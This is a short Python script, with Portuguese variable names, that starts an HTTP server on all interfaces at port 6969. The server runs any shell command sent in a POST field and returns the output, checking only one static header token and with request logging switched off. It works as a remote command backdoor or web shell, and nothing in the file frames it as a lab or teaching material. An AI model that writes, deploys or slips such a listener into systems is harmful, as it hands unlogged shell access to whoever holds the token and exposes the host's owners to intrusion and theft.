# -*- coding: utf-8 -*-
from http.server import BaseHTTPRequestHandler, HTTPServer
import cgi
import subprocess

senha_autenticacao = 'REPLACE_AUTH_TOKEN'

class MyRequestHandler(BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        pass  # Suppress default logs

    def do_POST(self):
        try:
            if 'Senha' in self.headers and self.headers['Senha'] == senha_autenticacao:
                form = cgi.FieldStorage(
                    fp=self.rfile,
                    headers=self.headers,
                    environ={'REQUEST_METHOD': 'POST'}
                )
                comando = form.getvalue('comando') or ''
                try:
                    resultado = subprocess.check_output(
                        comando, shell=True, stderr=subprocess.STDOUT
                    )
                except subprocess.CalledProcessError as e:
                    resultado = e.output

                self.send_response(200)
                self.send_header('Content-type', 'text/plain; charset=utf-8')
                self.end_headers()
                self.wfile.write(resultado)
            else:
                self.send_response(401)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write('Nao autorizado!'.encode())
        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(('Erro interno: ' + str(e)).encode())

host = '0.0.0.0'
port = 6969
server = HTTPServer((host, port), MyRequestHandler)
print('Servidor modulo iniciado em {}:{}'.format(host, port))
server.serve_forever()
